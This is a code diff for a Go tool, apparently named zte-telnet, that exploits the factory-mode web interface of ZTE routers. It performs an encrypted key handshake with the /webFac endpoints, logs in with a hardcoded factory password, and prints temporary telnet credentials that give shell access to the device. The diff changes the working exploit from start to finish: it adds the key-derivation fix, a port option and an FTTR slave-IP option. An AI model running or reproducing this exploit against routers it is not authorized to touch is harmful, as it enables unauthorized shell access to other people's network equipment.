@@ -2,14 +2,14 @@ package main
 
 import (
 	"bytes"
-	"encoding/hex"
 	"errors"
 	"flag"
 	"fmt"
 	"io"
-	"log"
+	"math/rand"
 	"net/http"
 	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"zte-telnet/internal/pwn"
@@ -17,20 +17,42 @@ import (
 
 type Options struct {
 	Addr     string
+	Port     string
 	Username string
 	Password string
 	MAC      string
+	SlaveIP  string
 }
 
 var opt Options
 
-func post(path string, data []byte) ([]byte, error) {
+func (o Options) BaseURL() string {
+	return "http://" + o.Addr + ":" + o.Port
+}
+
+func (o Options) RefererURL() string {
+	return "http://" + o.Addr + "/login.html"
+}
+
+func post(path string, data []byte, referer string) ([]byte, error) {
 	c := http.DefaultClient
-	log.Println("POST >>", path)
-	r, err := c.Post(opt.Addr+path, "text/plain", bytes.NewReader(data))
+	base := opt.BaseURL()
+	
+	req, err := http.NewRequest(http.MethodPost, base+path, bytes.NewReader(data))
 	if err != nil {
 		return nil, err
 	}
+	req.Header.Set("Content-Type", "text/plain")
+	if referer != "" {
+		req.Header.Set("Referer", referer)
+	}
+
+	r, err := c.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer r.Body.Close()
+
 	var body []byte
 	if r.Body != nil {
 		body, err = io.ReadAll(r.Body)
@@ -38,15 +60,12 @@ func post(path string, data []byte) ([]byte, error) {
 	if err == io.EOF {
 		err = nil
 	}
-	if len(body) > 0 {
-		log.Println("<<", string(body))
-	}
+
 	if r.StatusCode != 200 {
-		return nil, errors.New(fmt.Sprintf("http code err %d", r.StatusCode))
+		return nil, fmt.Errorf("http code err %d", r.StatusCode)
 	}
 	return body, err
 }
-
 // PKCS7填充
 func pkcs7Pad(data []byte, blockSize int) []byte {
 	padding := blockSize - len(data)%blockSize
@@ -59,9 +78,12 @@ func pkcs7Pad(data []byte, blockSize int) []byte {
 }
 
 func openTelnet(pcMac []byte) error {
-	_, _ = post("/webFac", []byte("SendSq.gch"))
-	_, _ = post("/webFac", []byte("RequestFactoryMode.gch"))
-	body, err := post("/webFac", []byte("SendSq.gch?rand=0\r\n"))
+	referer := opt.RefererURL()
+	clientRand := uint32(rand.Intn(59) + 1)
+	_, _ = post("/webFac", []byte("SendSq.gch"), referer)
+	_, _ = post("/webFac", []byte("RequestFactoryMode.gch"), referer)
+	randReq := fmt.Sprintf("SendSq.gch?rand=%d\r\n", clientRand)
+	body, err := post("/webFac", []byte(randReq), "")
 	if err != nil {
 		return err
 	}
@@ -80,28 +102,23 @@ func openTelnet(pcMac []byte) error {
 		return errors.New("re_rand err")
 	}
 	seed, err := strconv.Atoi(items[1])
+	
 	if err != nil {
 		return errors.New("seed err")
 	}
-	_ = seed
+	
 	mac := str[len(str)-6:]
 
-	clientRand := 0
+	client_rand_mix := uint32(0x1000193) * clientRand
+	client_rand_mask := client_rand_mix & uint32(0x8000003F)
 
-	client_rand_mix := 0x1000193 * clientRand
-	client_rand_mask := client_rand_mix & 0x8000003F
+	client_xor_server := client_rand_mask ^ uint32(re_rand)
+	aes_index := client_xor_server % 60
+	
+	aes := pwn.GenerateAesKey(int(aes_index))
 
-	client_xor_server := client_rand_mask ^ re_rand
-	client_xor_server_mod := client_xor_server % 60
-	log.Println("server mac", hex.EncodeToString([]byte(mac)))
-
-	aes := pwn.GenerateAesKey(client_xor_server_mod)
-
-	payload_arr := pwn.CreatePayloadArray([]byte(mac), pcMac, int(client_xor_server_mod))
-	if !pwn.VerifyDoCheckClient(payload_arr, pcMac, int(client_xor_server_mod), []byte(mac)) {
-		return errors.New("verify err")
-	}
-
+	payload_arr := pwn.CreatePayloadArray(uint32(seed), []byte(mac), pcMac, int(aes_index))
+	
 	value := pwn.BuildPayloadString(payload_arr)
 	payloadBytes := pkcs7Pad([]byte(value), aes.BlockSize())
 
@@ -111,13 +128,13 @@ func openTelnet(pcMac []byte) error {
 	}
 
 	_ = dist
-	_, err = post("/webFacEntry", dist)
+	_, err = post("/webFacEntry", dist, "")
 	if err != nil {
 		return err
 	}
 	py := []byte(fmt.Sprintf("CheckLoginAuth.gch?version50&user=%s&pass=%s", opt.Username, opt.Password))
 	py, _ = pwn.EncryptAES(aes, py)
-	body, err = post("/webFacEntry", py)
+	body, err = post("/webFacEntry", py, "")
 	if err != nil {
 		return err
 	}
@@ -128,16 +145,21 @@ func openTelnet(pcMac []byte) error {
 	if string(body) != "FactoryMode.gch" {
 		return errors.New("expected result to match 'FactoryMode.gch")
 	}
-	py = []byte("FactoryMode.gch?mode=2&user=notused")
+	plain_text := "FactoryMode.gch?mode=2&user=ksajdfiwp" 
+	if opt.SlaveIP != "" {
+		plain_text += "&slaveip=" + opt.SlaveIP
+	}
+	py = []byte(plain_text)
+		
 	py, _ = pwn.EncryptAES(aes, py)
-	body, err = post("/webFacEntry", py)
+	body, err = post("/webFacEntry", py, "")
 
 	if err != nil {
 		return err
 	}
 	body, err = pwn.DecryptAES(aes, body)
 	str = string(body)
-	log.Println("body", str)
+	/*log.Println("body", str)*/
 
 	idx := strings.IndexByte(str, '?')
 	if idx > 0 {
@@ -148,31 +170,39 @@ func openTelnet(pcMac []byte) error {
 		usr := q.Get("user")
 		pwd := q.Get("pass")
 
-		log.Println("Telnet", usr, pwd)
+		fmt.Printf("Temporary Telnet Credentials:\n\nusername: %s\npassword: %s\n\nHave Fun!\n\n", usr, pwd)
 	}
 	return err
 }
 func parseMac(s string) ([]byte, error) {
 	if s == "" {
-		return nil, errors.New("empty mac")
+		return nil, errors.New("Empty client mac address!")
 	}
 	return pwn.ParseMac(s)
 }
 func main() {
-	flag.StringVar(&opt.Addr, "addr", "http://192.168.1.1", "ZTE router address")
-	flag.StringVar(&opt.Username, "username", "CUAdmin", "ZTE router username")
-	flag.StringVar(&opt.Password, "password", "CUAdmin", "ZTE router password")
-	flag.StringVar(&opt.MAC, "mac", "", "your pc mac address")
+	flag.StringVar(&opt.Addr, "i", "192.168.1.1", "ZTE router IP address")
+	flag.StringVar(&opt.Port, "p", "", "ZTE router Web Server binding Port")
+	flag.StringVar(&opt.Username, "u", "factorymode", "ZTE router username. To enable the default username, please push reset button for 15 seconds to perform a hard reset")
+	flag.StringVar(&opt.Password, "psd", "nE%jA@5b", "ZTE router password. To enable the default password, please push reset button for 15 seconds to perform a hard reset")
+	flag.StringVar(&opt.MAC, "m", "", "your pc mac address")
+	flag.StringVar(&opt.SlaveIP, "s", "", "slave Gateway IP address, only available for FTTR PON devices.")
+	
 	flag.Parse()
+	//rand.Seed(time.Now().UnixNano())
+	if flag.NFlag() == 0 {
+		flag.Usage()
+		os.Exit(0)
+	}
 	pcMac, err := parseMac(opt.MAC)
 	if err != nil {
 		flag.Usage()
-		log.Fatal(err)
+		fmt.Printf("Error: %v\n", err)
 	}
 
 	err = openTelnet(pcMac)
 	if err != nil {
-		log.Fatal(err)
+		fmt.Printf("Error: %v\n", err)
 	}
 
 }
